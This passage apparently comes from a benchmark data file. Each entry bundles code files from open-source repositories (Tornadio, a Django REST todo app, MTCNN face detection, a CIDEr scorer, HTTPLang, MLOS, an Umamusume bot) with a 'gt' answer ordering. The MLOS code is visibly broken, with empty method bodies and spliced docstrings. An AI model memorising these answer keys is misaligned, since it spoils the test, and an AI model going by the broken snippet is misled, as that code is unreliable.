None:\n            heappush(self._queue, session)\n\n        return session\n\n    def get(self, session_id):\n\n        return self._items.get(session_id, None)\n\n    def remove(self, session_id):\n\n        session = self._items.get(session_id, None)\n\n        if session is not None:\n            session.promoted = -1\n            session.on_delete(True)\n            return True\n\n        return False\n\n    def expire(self, current_time=None):\n\n        if not self._queue:\n            return\n\n        if current_time is None:\n            current_time = time()\n\n        while self._queue:\n\n            top = self._queue[0]\n\n\n\n            if top.promoted is None and top.expiry_date > current_time:\n                break\n\n\n            top = heappop(self._queue)\n\n            need_reschedule = (top.promoted is not None\n                               and top.promoted > current_time)\n\n\n            if not need_reschedule:\n                top.promoted = None\n                top.on_delete(False)\n\n                need_reschedule = (top.promoted is not None\n                                   and top.promoted > current_time)\n\n\n\n            if need_reschedule:\n                top.expiry_date = top.promoted\n                top.promoted = None\n                heappush(self._queue, top)\n            else:\n                del self._items[top.session_id]\n\n'tornadio/tornadio/router.py'\n:\n\nimport logging\n\nfrom tornado import ioloop\nfrom tornado.web import RequestHandler, HTTPError\n\nfrom tornadio import persistent, polling, session\n\nPROTOCOLS = {\n    'websocket': persistent.TornadioWebSocketHandler,\n    'flashsocket': persistent.TornadioFlashSocketHandler,\n    'xhr-polling': polling.TornadioXHRPollingSocketHandler,\n    'xhr-multipart': polling.TornadioXHRMultipartSocketHandler,\n    'htmlfile': polling.TornadioHtmlFileSocketHandler,\n    'jsonp-polling': polling.TornadioJSONPSocketHandler,\n    }\n\nDEFAULT_SETTINGS = {\n\n    'session_check_interval': 15,\n\n    'session_expiry': 30,\n\n\n    'heartbeat_interval': 12,\n\n    'enabled_protocols': ['websocket', 'flashsocket', 'xhr-multipart',\n                          'xhr-polling', 'jsonp-polling', 'htmlfile'],\n\n    'xhr_polling_timeout': 20,\n    }\n\n\nclass SocketRouterBase(RequestHandler):\n\n    _connection = None\n    _route = None\n    _sessions = None\n    _sessions_cleanup = None\n    settings = None\n\n    def _execute(self, transforms, *args, **kwargs):\n        try:\n            extra = kwargs['extra']\n            proto_name = kwargs['protocol']\n            proto_init = kwargs['protocol_init']\n            session_id = kwargs['session_id']\n\n            logging.debug('Incoming session %s(%s) Session ID: %s Extra: %s' % (\n                proto_name,\n                proto_init,\n                session_id,\n                extra\n                ))\n\n\n            if proto_name not in self.settings['enabled_protocols']:\n                raise HTTPError(403, 'Forbidden')\n\n            protocol = PROTOCOLS.get(proto_name, None)\n\n            if protocol:\n                handler = protocol(self, session_id)\n                handler._execute(transforms, *extra, **kwargs)\n            else:\n                raise Exception('Handler for protocol \"%s\" is not available' %\n                                proto_name)\n        except ValueError:\n\n            raise HTTPError(403, 'Forbidden')\n\n    @property\n    def connection(self):\n\n        return self._connection\n\n    @property\n    def sessions(self):\n        return self._sessions\n\n    @classmethod\n    def route(cls):\n\n        return cls._route\n\n    @classmethod\n    def tornadio_initialize(cls, connection, user_settings, resource,\n                            io_loop=None, extra_re=None, extra_sep=None):\n\n\n\n\n        cls._connection = connection\n\n\n        cls.io_loop = io_loop or ioloop.IOLoop.instance()\n\n\n        settings = DEFAULT_SETTINGS.copy()\n\n        if user_settings is not None:\n            settings.update(user_settings)\n\n        cls.settings = settings\n\n\n        cls._sessions = session.SessionContainer()\n\n        check_interval = settings['session_check_interval'] * 1000\n        cls._sessions_cleanup = ioloop.PeriodicCallback(cls._sessions.expire,\n                                                        check_interval,\n                                                        cls.io_loop).start()\n\n\n        if extra_re:\n            if not extra_re.startswith('(?P<extra>'):\n                extra_re = r'(?P<extra>%s)' % extra_re\n            if extra_sep:\n                extra_re = extra_sep + extra_re\n        else:\n            extra_re = \"(?P<extra>)\"\n\n        proto_re = \"|\".join(PROTOCOLS.keys())\n\n        cls._route = (r\"/(?P<resource>%s)%s/\"\n                      \"(?P<protocol>%s)/?\"\n                      \"(?P<session_id>[0-9a-zA-Z]*)/?\"\n                      \"(?P<protocol_init>\\d*?)|(?P<xhr_path>\\w*?)/?\"\n                      \"(?P<jsonp_index>\\d*?)\" % (resource,\n                                                 extra_re,\n                                                 proto_re),\n                      cls)\n\ndef get_router(handler, settings=None, resource='socket.io/*',\n               io_loop=None, extra_re=None, extra_sep=None):\n\n    router = type('SocketRouter', (SocketRouterBase,), {})\n    router.tornadio_initialize(handler, settings, resource,\n                               io_loop, extra_re, extra_sep)\n    return router\n\n'tornadio/examples/transports/transports.py'\n:from os import path as op\n\nimport tornado.web\nimport tornadio\nimport tornadio.router\nimport tornadio.server\n\nROOT = op.normpath(op.dirname(__file__))\n\nclass IndexHandler(tornado.web.RequestHandler):\n\n    def get(self):\n        self.render(\"index.html\")\n\nclass ChatConnection(tornadio.SocketConnection):\n\n    participants = set()\n\n    def on_open(self, *args, **kwargs):\n        self.send(\"Welcome from the server.\")\n\n    def on_message(self, message):\n\n        self.send(message)\n\n\nChatRouter = tornadio.get_router(ChatConnection)\n\n\napplication = tornado.web.Application(\n    [(r\"/\", IndexHandler), ChatRouter.route()],\n    flash_policy_port = 843,\n    flash_policy_file = op.join(ROOT, 'flashpolicy.xml'),\n    socket_io_port = 8001\n)\n\nif __name__ == \"__main__\":\n    import logging\n    logging.getLogger().setLevel(logging.DEBUG)\n\n    tornadio.server.SocketServer(application)\n\n",
        "gt": [
            "'tornadio/tornadio/session.py'",
            "'tornadio/tornadio/router.py'",
            "'tornadio/examples/transports/transports.py'"
        ]
    },
    {
        "files": [
            "'DRF-TDD-example/todoapp/todos/serializers.py'",
            "'DRF-TDD-example/todoapp/todos/views.py'",
            "'DRF-TDD-example/todoapp/todos/urls.py'"
        ],
        "content": "'DRF-TDD-example/todoapp/todos/serializers.py'\n:from django.contrib.auth.models import User\nfrom rest_framework import serializers\nfrom todos.models import Todo\n\n\nclass TodoUserSerializer(serializers.ModelSerializer):\n\n    class Meta:\n        model = User\n        fields = (\"id\", \"username\", \"email\", \"date_joined\")\n\n\nclass TodoSerializer(serializers.ModelSerializer):\n    user = TodoUserSerializer(read_only=True)\n\n    class Meta:\n        model = Todo\n        fields = (\"user\", \"name\", \"done\", \"date_created\")\n\n'DRF-TDD-example/todoapp/todos/views.py'\n:from rest_framework.generics import ListCreateAPIView, RetrieveUpdateDestroyAPIView\nfrom rest_framework.permissions import IsAuthenticated\n\nfrom todos.models import Todo\nfrom todos.permissions import UserIsOwnerTodo\nfrom todos.serializers import TodoSerializer\n\n\nclass TodoListCreateAPIView(ListCreateAPIView):\n    serializer_class = TodoSerializer\n\n    def get_queryset(self):\n        return Todo.objects.filter(user=self.request.user)\n\n    def perform_create(self, serializer):\n        serializer.save(user=self.request.user)\n\n\nclass TodoDetailAPIView(RetrieveUpdateDestroyAPIView):\n    serializer_class = TodoSerializer\n    queryset = Todo.objects.all()\n    permission_classes = (IsAuthenticated, UserIsOwnerTodo)\n\n\n\n'DRF-TDD-example/todoapp/todos/urls.py'\n:from django.urls import path\nfrom todos.views import TodoListCreateAPIView, TodoDetailAPIView\n\napp_name = 'todos'\n\nurlpatterns = [\n    path('', TodoListCreateAPIView.as_view(), name=\"list\"),\n    path('<int:pk>/', TodoDetailAPIView.as_view(), name=\"detail\"),\n]\n",
        "gt": [
            "'DRF-TDD-example/todoapp/todos/serializers.py'",
            "'DRF-TDD-example/todoapp/todos/views.py'",
            "'DRF-TDD-example/todoapp/todos/urls.py'"
        ]
    },
    {
        "files": [
            "'caface/demo/face_alignment/mtcnn_pytorch/src/__init__.py'",
            "'caface/demo/face_alignment/mtcnn_pytorch/src/detector.py'",
            "'caface/demo/face_alignment/mtcnn_pytorch/src/first_stage.py'"
        ],
        "content": "'caface/demo/face_alignment/mtcnn_pytorch/src/__init__.py'\n:from .visualization_utils import show_bboxes\nfrom .detector import detect_faces\n\n'caface/demo/face_alignment/mtcnn_pytorch/src/detector.py'\n:import numpy as np\nimport torch\nfrom torch.autograd import Variable\nfrom .get_nets import PNet, RNet, ONet\nfrom .box_utils import nms, calibrate_box, get_image_boxes, convert_to_square\nfrom .first_stage import run_first_stage\n\n\ndef detect_faces(image, min_face_size=20.0,\n                 thresholds=[0.6, 0.7, 0.8],\n                 nms_thresholds=[0.7, 0.7, 0.7]):\n\n\n\n    pnet = PNet()\n    rnet = RNet()\n    onet = ONet()\n\n    device = 'cpu'\n    pnet.to(device)\n    rnet.to(device)\n    onet.to(device)\n    onet.eval()\n\n\n    width, height = image.size\n    min_length = min(height, width)\n\n    min_detection_size = 12\n    factor = 0.707\n\n\n    scales = []\n\n\n\n\n    m = min_detection_size/min_face_size\n    min_length *= m\n\n    factor_count = 0\n    while min_length > min_detection_size:\n        scales.append(m*factor**factor_count)\n        min_length *= factor\n        factor_count += 1\n\n\n\n\n    bounding_boxes = []\n\n    with torch.no_grad():\n\n        for s in scales:\n            boxes = run_first_stage(image, pnet, scale=s, threshold=thresholds[0])\n            bounding_boxes.append(boxes)\n\n\n        bounding_boxes = [i for i in bounding_boxes if i is not None]\n        bounding_boxes = np.vstack(bounding_boxes)\n\n        keep = nms(bounding_boxes[:, 0:5], nms_thresholds[0])\n        bounding_boxes = bounding_boxes[keep]\n\n\n        bounding_boxes = calibrate_box(bounding_boxes[:, 0:5], bounding_boxes[:, 5:])\n\n\n        bounding_boxes = convert_to_square(bounding_boxes)\n        bounding_boxes[:, 0:4] = np.round(bounding_boxes[:, 0:4])\n\n\n\n        img_boxes = get_image_boxes(bounding_boxes, image, size=24)\n        img_boxes = torch.FloatTensor(img_boxes).to(device)\n\n        output = rnet(img_boxes)\n        offsets = output[0].cpu().data.numpy()\n        probs = output[1].cpu().data.numpy()\n\n        keep = np.where(probs[:, 1] > thresholds[1])[0]\n        bounding_boxes = bounding_boxes[keep]\n        bounding_boxes[:, 4] = probs[keep, 1].reshape((-1,))\n        offsets = offsets[keep]\n\n        keep = nms(bounding_boxes, nms_thresholds[1])\n        bounding_boxes = bounding_boxes[keep]\n        bounding_boxes = calibrate_box(bounding_boxes, offsets[keep])\n        bounding_boxes = convert_to_square(bounding_boxes)\n        bounding_boxes[:, 0:4] = np.round(bounding_boxes[:, 0:4])\n\n\n\n        img_boxes = get_image_boxes(bounding_boxes, image, size=48)\n        if len(img_boxes) == 0:\n            return [], []\n        img_boxes = torch.FloatTensor(img_boxes).to(device)\n        output = onet(img_boxes)\n        landmarks = output[0].cpu().data.numpy()\n        offsets = output[1].cpu().data.numpy()\n        probs = output[2].cpu().data.numpy()\n\n        keep = np.where(probs[:, 1] > thresholds[2])[0]\n        bounding_boxes = bounding_boxes[keep]\n        bounding_boxes[:, 4] = probs[keep, 1].reshape((-1,))\n        offsets = offsets[keep]\n        landmarks = landmarks[keep]\n\n\n        width = bounding_boxes[:, 2] - bounding_boxes[:, 0] + 1.0\n        height = bounding_boxes[:, 3] - bounding_boxes[:, 1] + 1.0\n        xmin, ymin = bounding_boxes[:, 0], bounding_boxes[:, 1]\n        landmarks[:, 0:5] = np.expand_dims(xmin, 1) + np.expand_dims(width, 1)*landmarks[:, 0:5]\n        landmarks[:, 5:10] = np.expand_dims(ymin, 1) + np.expand_dims(height, 1)*landmarks[:, 5:10]\n\n        bounding_boxes = calibrate_box(bounding_boxes, offsets)\n        keep = nms(bounding_boxes, nms_thresholds[2], mode='min')\n        bounding_boxes = bounding_boxes[keep]\n        landmarks = landmarks[keep]\n\n    return bounding_boxes, landmarks\n\n'caface/demo/face_alignment/mtcnn_pytorch/src/first_stage.py'\n:import torch\nfrom torch.autograd import Variable\nimport math\nfrom PIL import Image\nimport numpy as np\nfrom .box_utils import nms, _preprocess\ndevice = torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\")\n\n\ndef run_first_stage(image, net, scale, threshold):\n\n\n\n    width, height = image.size\n    sw, sh = math.ceil(width*scale), math.ceil(height*scale)\n    img = image.resize((sw, sh), Image.BILINEAR)\n    img = np.asarray(img, 'float32')\n\n    img = torch.FloatTensor(_preprocess(img)).to(net.features.conv1.weight.device)\n    with torch.no_grad():\n        output = net(img)\n        probs = output[1].cpu().data.numpy()[0, 1, :, :]\n        offsets = output[0].cpu().data.numpy()\n\n\n\n        boxes = _generate_bboxes(probs, offsets, scale, threshold)\n        if len(boxes) == 0:\n            return None\n\n        keep = nms(boxes[:, 0:5], overlap_threshold=0.5)\n    return boxes[keep]\n\n\ndef _generate_bboxes(probs, offsets, scale, threshold):\n\n\n\n\n    stride = 2\n    cell_size = 12\n\n\n    inds = np.where(probs > threshold)\n\n    if inds[0].size == 0:\n        return np.array([])\n\n\n    tx1, ty1, tx2, ty2 = [offsets[0, i, inds[0], inds[1]] for i in range(4)]\n\n\n\n\n\n\n\n\n    offsets = np.array([tx1, ty1, tx2, ty2])\n    score = probs[inds[0], inds[1]]\n\n\n\n    bounding_boxes = np.vstack([\n        np.round((stride*inds[1] + 1.0)/scale),\n        np.round((stride*inds[0] + 1.0)/scale),\n        np.round((stride*inds[1] + 1.0 + cell_size)/scale),\n        np.round((stride*inds[0] + 1.0 + cell_size)/scale),\n        score, offsets\n    ])\n\n\n    return bounding_boxes.T\n",
        "gt": [
            "'caface/demo/face_alignment/mtcnn_pytorch/src/first_stage.py'",
            "'caface/demo/face_alignment/mtcnn_pytorch/src/detector.py'",
            "'caface/demo/face_alignment/mtcnn_pytorch/src/__init__.py'"
        ]
    },
    {
        "files": [
            "'Xmodal-Ctx/m2/evaluation/cider/cider.py'",
            "'Xmodal-Ctx/m2/evaluation/cider/__init__.py'",
            "'Xmodal-Ctx/m2/evaluation/cider/cider_scorer.py'"
        ],
        "content": "'Xmodal-Ctx/m2/evaluation/cider/cider.py'\n:\n\n\n\n\n\n\n\n\nfrom .cider_scorer import CiderScorer\n\nclass Cider:\n\n    def __init__(self, gts=None, n=4, sigma=6.0):\n\n        self._n = n\n\n        self._sigma = sigma\n        self.doc_frequency = None\n        self.ref_len = None\n        if gts is not None:\n            tmp_cider = CiderScorer(gts, n=self._n, sigma=self._sigma)\n            self.doc_frequency = tmp_cider.doc_frequency\n            self.ref_len = tmp_cider.ref_len\n\n    def compute_score(self, gts, res):\n\n        assert(gts.keys() == res.keys())\n        cider_scorer = CiderScorer(gts, test=res, n=self._n, sigma=self._sigma, doc_frequency=self.doc_frequency,\n                                   ref_len=self.ref_len)\n        return cider_scorer.compute_score()\n\n    def __str__(self):\n        return 'CIDEr'\n\n'Xmodal-Ctx/m2/evaluation/cider/__init__.py'\n:from .cider import Cider\n'Xmodal-Ctx/m2/evaluation/cider/cider_scorer.py'\n:\n\n\n\nimport copy\nfrom collections import defaultdict\nimport numpy as np\nimport math\n\ndef precook(s, n=4):\n\n    words = s.split()\n    counts = defaultdict(int)\n    for k in range(1,n+1):\n        for i in range(len(words)-k+1):\n            ngram = tuple(words[i:i+k])\n            counts[ngram] += 1\n    return counts\n\ndef cook_refs(refs, n=4):\n\n    return [precook(ref, n) for ref in refs]\n\ndef cook_test(test, n=4):\n\n    return precook(test, n)\n\nclass CiderScorer(object):\n\n\n    def __init__(self, refs, test=None, n=4, sigma=6.0, doc_frequency=None, ref_len=None):\n\n        self.n = n\n        self.sigma = sigma\n        self.crefs = []\n        self.ctest = []\n        self.doc_frequency = defaultdict(float)\n        self.ref_len = None\n\n        for k in refs.keys():\n            self.crefs.append(cook_refs(refs[k]))\n            if test is not None:\n                self.ctest.append(cook_test(test[k][0]))\n            else:\n                self.ctest.append(None)\n\n        if doc_frequency is None and ref_len is None:\n\n            self.compute_doc_freq()\n\n            self.ref_len = np.log(float(len(self.crefs)))\n        else:\n            self.doc_frequency = doc_frequency\n            self.ref_len = ref_len\n\n    def compute_doc_freq(self):\n\n        for refs in self.crefs:\n\n            for ngram in set([ngram for ref in refs for (ngram,count) in ref.items()]):\n                self.doc_frequency[ngram] += 1\n\n\n    def compute_cider(self):\n        def counts2vec(cnts):\n\n            vec = [defaultdict(float) for _ in range(self.n)]\n            length = 0\n            norm = [0.0 for _ in range(self.n)]\n            for (ngram,term_freq) in cnts.items():\n\n                df = np.log(max(1.0, self.doc_frequency[ngram]))\n\n                n = len(ngram)-1\n\n                vec[n][ngram] = float(term_freq)*(self.ref_len - df)\n\n                norm[n] += pow(vec[n][ngram], 2)\n\n                if n == 1:\n                    length += term_freq\n            norm = [np.sqrt(n) for n in norm]\n            return vec, norm, length\n\n        def sim(vec_hyp, vec_ref, norm_hyp, norm_ref, length_hyp, length_ref):\n\n            delta = float(length_hyp - length_ref)\n\n            val = np.array([0.0 for _ in range(self.n)])\n            for n in range(self.n):\n\n                for (ngram,count) in vec_hyp[n].items():\n\n                    val[n] += min(vec_hyp[n][ngram], vec_ref[n][ngram]) * vec_ref[n][ngram]\n\n                if (norm_hyp[n] != 0) and (norm_ref[n] != 0):\n                    val[n] /= (norm_hyp[n]*norm_ref[n])\n\n                assert(not math.isnan(val[n]))\n\n                val[n] *= np.e**(-(delta**2)/(2*self.sigma**2))\n            return val\n\n        scores = []\n        for test, refs in zip(self.ctest, self.crefs):\n\n            vec, norm, length = counts2vec(test)\n\n            score = np.array([0.0 for _ in range(self.n)])\n            for ref in refs:\n                vec_ref, norm_ref, length_ref = counts2vec(ref)\n                score += sim(vec, vec_ref, norm, norm_ref, length, length_ref)\n\n            score_avg = np.mean(score)\n\n            score_avg /= len(refs)\n\n            score_avg *= 10.0\n\n            scores.append(score_avg)\n        return scores\n\n    def compute_score(self):\n\n        score = self.compute_cider()\n\n\n        return np.mean(np.array(score)), np.array(score)",
        "gt": [
            "'Xmodal-Ctx/m2/evaluation/cider/cider_scorer.py'",
            "'Xmodal-Ctx/m2/evaluation/cider/cider.py'",
            "'Xmodal-Ctx/m2/evaluation/cider/__init__.py'"
        ]
    },
    {
        "files": [
            "'HTTPLang/httplang/tokenize.py'",
            "'HTTPLang/httplang/parse.py'",
            "'HTTPLang/httplang/__init__.py'",
            "'HTTPLang/httplang.py'"
        ],
        "content": "'HTTPLang/httplang/tokenize.py'\n:import re\nimport sys\n\ntokens = {\n        \"^do$\":\"DO\",\n        \"^set$\":\"SET\",\n        \"^GET$|^POST$|^PUT$|^DELETE$|^PATCH$\":\"METHOD\",\n        \"^URL$|^SETCOOKIE$|^COOKIE$|^RESPONSE$|^POSTDATA$|^USERAGENT$|^STATUS$|^LINKS$\":\"GLOBAL\",\n        \"^show$\":\"SHOW\",\n        \"^if$\":\"CONDITION\",\n        \"^label$\":\"LABEL\",\n        \"^goto$\":\"GOTO\",\n        \">|<|==|!=|>=|<=\":\"OPERATOR\",\n        \"\\\"(.*?)\\\"\":\"STRING\",\n        \"[0-9]+\":\"INTEGER\"\n}\n\ndef getTokens(stream):\n    token = \"\"\n    line = 1\n    for char in stream.read():\n        if char == \" \" or char == \"\\n\":\n            for token_check in tokens:\n                check = re.findall(token_check, token)\n                if check:\n                    token = \"\"\n                    yield {\n                            \"lexeme\":check[0],\n                            \"tokenType\":tokens[token_check]\n                          }\n                    break\n            else:\n                sys.exit(\"Invalid Token: {} on line {}\".format(token, line))\n            if char == \"\\n\":\n                line += 1\n        else:\n            token += char\n\nif __name__ == \"__main__\":\n    print(list(getTokens(open(\"test.httpl\"))))\n\n'HTTPLang/httplang/parse.py'\n:import tokenize\nimport sys\nimport global_data\nimport itertools\n\nglobal line\nline = 0\n\nclass AST:\n    def __init__(self, left, right, tt, lexeme, l):\n        self.left = left\n        self.right = right\n        self.token_type = tt\n        self.lexeme = lexeme\n        self.line = l\n\ndef program(tokens):\n    global line\n    switch = {\n        \"DO\":do,\n        \"SET\":set_,\n        \"SHOW\":show,\n        \"LABEL\":label,\n        \"GOTO\":goto,\n        \"CONDITION\":condition\n    }\n    for token in tokens:\n        tt = token['tokenType']\n        if switch.get(tt):\n            line += 1\n            yield switch[tt](tokens)\n        else:\n            sys.exit(\"Parse Error: Don't know what to do with {} line {}\".format(token, line))\n\ndef condition(tokens):\n    condition_expr = expr(tokens)\n    goto_check = tokens.next()\n    if goto_check['tokenType'] != \"GOTO\":\n        sys.exit(\"Parse Error: goto expected after condition line {}\".format(line))\n    goto_part = goto(tokens)\n    return AST(condition_expr, goto_part, \"CONDITION\", None, line)\n\ndef do(tokens):\n    method_val = method(tokens)\n    location = string(tokens)\n    return AST(method_val, location, \"DO\", None, line)\n\ndef set_(tokens):\n    global_val = global_var(tokens)\n    tokens, copy = itertools.tee(tokens)\n    type_check = copy.next()['tokenType']\n    if type_check == \"GLOBAL\":\n        location = global_var(tokens)\n    else:\n        location = string(tokens)\n    return AST(global_val, location, \"SET\", None, line)\n\ndef expr(tokens):\n    left_arg = tokens.next()\n    if left_arg['tokenType'] not in [\"GLOBAL\", \"STRING\", \"INTEGER\"]:\n        sys.exit(\"Parse Error: Invalid left argument {} line {}\".format(left_arg['lexeme'], line))\n\n    op = tokens.next()\n    if op['tokenType'] != \"OPERATOR\":\n        sys.exit(\"Parse Error: Invalid operator {} line {}\".format(op['lexeme'], line))\n\n    right_arg = tokens.next()\n    if right_arg['tokenType'] not in [\"GLOBAL\", \"STRING\", \"INTEGER\"]:\n        sys.exit(\"Parse Error: Invalid right argument {} line {}\".format(right_arg[\"lexeme\"], line))\n    return AST(\n            AST(None, None, left_arg['tokenType'], left_arg['lexeme'], line),\n            AST(None, None, right_arg[\"tokenType\"], right_arg['lexeme'], line),\n            \"OPERATOR\",\n            op['lexeme'],\n            line)\n\ndef show(tokens):\n    tokens, copy = itertools.tee(tokens)\n    type_check = copy.next()['tokenType']\n    if type_check == \"STRING\":\n        variable_name = string(tokens)\n    else:\n        variable_name = global_var(tokens)\n    return AST(variable_name, None, \"SHOW\", None, line)\n\ndef label(tokens):\n    label_name = string(tokens)\n    global_data.labels[label_name.lexeme] = line - 1\n    return AST(label_name, None, \"LABEL\", None, line)\n\ndef goto(tokens):\n    label_name = string(tokens)\n    return AST(label_name, None, \"GOTO\", None, line)\n\ndef string(tokens):\n    string_val = tokens.next()\n    if string_val['tokenType'] != \"STRING\":\n        sys.exit(\"Parse Error: {} is not a STRING line {}\".format(string_val['lexeme'], line))\n    return AST(None, None, string_val['tokenType'], string_val['lexeme'], line)\n\ndef integer(tokens):\n    int_val = tokens.next()\n    if int_val['tokenType'] != \"INTEGER\":\n        sys.exit(\"TypeError: {} is not an INTEGER line {}\".format(int_val['lexeme'], line))\n    try:\n        int_val['lexeme'] = int(int_val['lexeme'])\n    except:\n        sys.exit(\"Type Error: {} is not an INTEGER\")\n\n    return AST(None, None, int_val['tokenType'], int_val['lexeme'], line)\n\ndef method(tokens):\n    method_val = tokens.next()\n    if method_val['tokenType'] != \"METHOD\":\n        sys.exit(\"Type Error: {} is not a METHOD line {}\".format(method_val['lexeme'], line))\n    return AST(None, None, method_val['tokenType'], method_val['lexeme'], line)\n\ndef global_var(tokens):\n    variable_val = tokens.next()\n    if variable_val['tokenType'] == \"GLOBAL_VAR\":\n        sys.exit(\"Type Error: {} is not a GLOBAL_VAR line {}\".format(variable_val['lexeme'], line))\n    return AST(None, None, variable_val['tokenType'], variable_val['lexeme'], line)\n\nif __name__ == \"__main__\":\n    print(list(program(tokenize.getTokens(open(\"test.httpl\")))))\n\n\n'HTTPLang/httplang/__init__.py'\n:import evaluate\nimport global_data\nimport make_request\nimport parse\nimport tokenize\n\n'HTTPLang/httplang.py'\n:from httplang import *\nimport sys\nimport os\n\nif len(sys.argv) < 2:\n    sys.exit(\"Usage: python httplang.py <file>.httpl\")\n\nif not os.path.exists(sys.argv[1]):\n    sys.exit(\"No file names {}\".format(sys.argv[1]))\n\nevaluate.evaluate(parse.program(tokenize.getTokens(open(sys.argv[1]))))\n",
        "gt": [
            "'HTTPLang/httplang/tokenize.py'",
            "'HTTPLang/httplang/parse.py'",
            "'HTTPLang/httplang/__init__.py'",
            "'HTTPLang/httplang.py'"
        ]
    },
    {
        "files": [
            "'MLOS/mlos_bench/mlos_bench/services/types/host_ops_type.py'",
            "'MLOS/mlos_bench/mlos_bench/environments/remote/saas_env.py'",
            "'MLOS/mlos_bench/mlos_bench/environments/remote/__init__.py'"
        ],
        "content": "'MLOS/mlos_bench/mlos_bench/services/types/host_ops_type.py'\n:\n\n\n\n\n\nfrom typing import Tuple, Protocol, runtime_checkable, TYPE_CHECKING\n\nif TYPE_CHECKING:\n    from mlos_bench.environments.status import Status\n\n\n@runtime_checkable\nclass SupportsHostOps(Protocol):\n\n\n    def start_host(self, params: dict) -> Tuple[\"Status\", dict]:\n\n\n    def stop_host(self, params: dict, force: bool = False) -> Tuple[\"Status\", dict]:\n\n\n    def restart_host(self, params: dict, force: bool = False) -> Tuple[\"Status\", dict]:\n\n\n    def wait_host_operation(self, params: dict) -> Tuple[\"Status\", dict]:\n        \"\"\"\n        Waits for a pending operation on a Host/VM to resolve to SUCCEEDED or FAILED.\n        Return TIMED_OUT when timing out.\n\n        Parameters\n        ----------\n        params: dict\n            Flat dictionary of (key, value) pairs of tunable parameters.\n            Must have the \"asyncResultsUrl\" key to get the results.\n            If the key is not present, return Status.PENDING.\n\n        Returns\n        -------\n        result : (Status, dict)\n            A pair of Status and result.\n            Status is one of {PENDING, SUCCEEDED, FAILED, TIMED_OUT}\n            Result is info on the operation runtime if SUCCEEDED, otherwise {}.\n\nCloud-based (configurable) SaaS environment.\n\n    Cloud-based (configurable) SaaS environment.\n\n        Create a new environment for (configurable) cloud-based SaaS instance.\n\n        Parameters\n        ----------\n        name: str\n            Human-readable name of the environment.\n        config : dict\n            Free-format dictionary that contains the benchmark environment\n            configuration. Each config must have at least the \"tunable_params\"\n            and the \"const_args\" sections.\n        global_config : dict\n            Free-format dictionary of global parameters (e.g., security credentials)\n            to be mixed in into the \"const_args\" section of the local config.\n        tunables : TunableGroups\n            A collection of tunable parameters for *all* environments.\n        service: Service\n            An optional service object\n            (e.g., providing methods to configure the remote service).\n        \"\"\"\n        super().__init__(name=name, config=config, global_config=global_config,\n                         tunables=tunables, service=service)\n\n        assert self._service is not None and isinstance(self._service, SupportsHostOps), \\\n            \"RemoteEnv requires a service that supports host operations\"\n        self._host_service: SupportsHostOps = self._service\n\n        assert self._service is not None and isinstance(self._service, SupportsRemoteConfig), \\\n            \"SaaSEnv requires a service that supports remote host configuration API\"\n        self._config_service: SupportsRemoteConfig = self._service\n\n    def setup(self, tunables: TunableGroups, global_config: Optional[dict] = None) -> bool:\n\n        _LOG.info(\"SaaS set up: %s :: %s\", self, tunables)\n        if not super().setup(tunables, global_config):\n            return False\n\n        (status, _) = self._config_service.configure(\n            self._params, self._tunable_params.get_param_values())\n        if not status.is_succeeded():\n            return False\n\n        (status, res) = self._config_service.is_config_pending(self._params)\n        if not status.is_succeeded():\n            return False\n\n\n        if res.get('isConfigPendingRestart') or res.get('isConfigPendingReboot'):\n            _LOG.info(\"Restarting: %s\", self)\n            (status, params) = self._host_service.restart_host(self._params)\n            if status.is_pending():\n                (status, _) = self._host_service.wait_host_operation(params)\n            if not status.is_succeeded():\n                return False\n\n            _LOG.info(\"Wait to restart: %s\", self)\n            (status, params) = self._host_service.start_host(self._params)\n            if status.is_pending():\n                (status, _) = self._host_service.wait_host_operation(params)\n\n        self._is_ready = status.is_succeeded()\n        return self._is_ready\n\n'MLOS/mlos_bench/mlos_bench/environments/remote/__init__.py'\n:\n\n\n\n\n\nfrom mlos_bench.environments.remote.host_env import HostEnv\nfrom mlos_bench.environments.remote.network_env import NetworkEnv\nfrom mlos_bench.environments.remote.os_env import OSEnv\nfrom mlos_bench.environments.remote.remote_env import RemoteEnv\nfrom mlos_bench.environments.remote.saas_env import SaaSEnv\nfrom mlos_bench.environments.remote.vm_env import VMEnv\n\n__all__ = [\n    'HostEnv',\n    'NetworkEnv',\n    'OSEnv',\n    'RemoteEnv',\n    'SaaSEnv',\n    'VMEnv',\n]\n",
        "gt": [
            "'MLOS/mlos_bench/mlos_bench/services/types/host_ops_type.py'",
            "'MLOS/mlos_bench/mlos_bench/environments/remote/saas_env.py'",
            "'MLOS/mlos_bench/mlos_bench/environments/remote/__init__.py'"
        ]
    },
    {
        "files": [
            "'UmamusumeAutoTrainer/module/umamusume/protocol/preset.py'",
            "'UmamusumeAutoTrainer/main.py'",
            "'UmamusumeAutoTrainer/module/umamusume/manifest.py'"
        ],
        "content": "'UmamusumeAutoTrainer/module/umamusume/protocol/preset.py'\n:from pydantic import BaseModel\n\n\nclass AddPresetRequest(BaseModel):\n    preset: str\n\n\n\n\n'UmamusumeAutoTrainer/main.py'\n:import sys\nimport threading\n\nfrom bot.base.manifest import register_app\nfrom bot.engine.scheduler import scheduler\nfrom module.umamusume.manifest import UmamusumeManifest\nfrom uvicorn import run\n\nif __name__ == '__main__':\n    if sys.version_info.minor != 10 or sys.version_info.micro != 9:\n        print(\"\\033[33m{}\\033[0m\".format(\"注意：python 版本号不正确，可能无法正常运行\"))\n        print(\"建议python版本：3.10.9 当前：\" + sys.version)\n    register_app(UmamusumeManifest)\n    scheduler_thread = threading.Thread(target=scheduler.init, args=())\n    scheduler_thread.start()\n    print(\"UAT running on http://127.0.0.1:8071\")\n    run(\"bot.server.handler:server\", host=\"127.0.0.1\", port=8071, log_level=\"error\")\n\n\n'UmamusumeAutoTrainer/module/umamusume/manifest.py'\n:from typing import Dict\n\nfrom bot.base.manifest import AppManifest\nfrom bot.base.resource import NOT_FOUND_UI\nfrom bot.server.handler import server\nfrom module.umamusume.asset.ui import *\nfrom module.umamusume.context import build_context\nfrom module.umamusume.hook import after_hook, before_hook\nfrom module.umamusume.script.cultivate_task.cultivate import *\nfrom module.umamusume.script.cultivate_task.info import script_info\nfrom module.umamusume.protocol.preset import AddPresetRequest\nfrom module.umamusume.task import UmamusumeTaskType, build_task\nfrom module.umamusume.user_data import read_presets, write_preset\n\nscript_dicts: Dict[UmamusumeTaskType, dict] = {\n    UmamusumeTaskType.UMAMUSUME_TASK_TYPE_CULTIVATE: {\n        INFO: script_info,\n        MAIN_MENU: script_main_menu,\n        